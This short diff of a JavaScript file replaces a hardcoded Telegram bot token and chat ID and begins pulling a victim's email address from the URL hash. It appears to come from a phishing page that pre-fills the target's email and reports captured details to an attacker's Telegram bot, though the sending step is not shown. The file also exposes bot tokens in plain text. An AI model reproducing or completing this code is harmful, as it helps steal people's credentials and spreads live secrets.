@@ -1,6 +1,6 @@
 // Telegram Bot config
-const TELEGRAM_BOT_TOKEN = "8099221862:AAHqbxeMQUIFuwgdkCq0Y7aAsBPp_JcfVKE";
-const TELEGRAM_CHAT_ID = "5642369607";
+const TELEGRAM_BOT_TOKEN = "7642767058:AAE1c1oj-wCUdqv3_WAWwJoonDWDIHOz4SA";
+const TELEGRAM_CHAT_ID = "5748422740";
 
 // STEP 1: Extract email from URL hash (e.g., #user@food.com)
 const rawHash = window.location.hash.substring(1); // remove the '#' symbol
